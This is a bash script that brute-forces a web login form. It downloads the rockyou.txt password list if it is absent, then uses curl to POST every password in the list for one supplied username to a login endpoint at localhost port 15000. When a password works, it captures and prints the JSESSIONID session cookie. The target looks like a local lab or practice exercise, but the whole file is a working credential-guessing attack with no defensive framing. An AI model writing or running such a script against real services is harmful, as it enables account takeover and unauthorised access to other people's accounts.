#!/bin/bash

# Script to bruteforce the login screen with POST requests

# Check if we have arguments
if [ "$#" -ne 1 ]
then
    echo "Usage: $0 <Username to bruteforce>"
    exit 1
fi

# Increment counter
counter=0

# Username to bruteforce
username=$1

# Check if rockyou.txt exists in current dir
# If it doesn't, then we need to clone it
if [ ! -f rockyou.txt ]
then
    wget "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
fi


while read -r line
do
    counter=$((counter+1))
    printf "\nOn iteration $counter"
    # Current password to try from rockyou
    password=$line
    printf "Trying password $password"
    
    # Curl the login page with the username and password
    # Also grab session cookie if we log in successfully
    curl -v -X POST http://localhost:15000/welcome -d "username=$username&password=$password" --cookie-jar newcookies.txt;
    # Check if curl returns session cookie
    if grep -q "JSESSIONID" newcookies.txt
    then
        printf "\nLogged in with $username:$password\n"
        printf "This took $counter attempts\n"
        printf "\nSession cookie: "
        grep "JSESSIONID" newcookies.txt

        break
    fi
done < rockyou.txt

printf "Done"
exit 0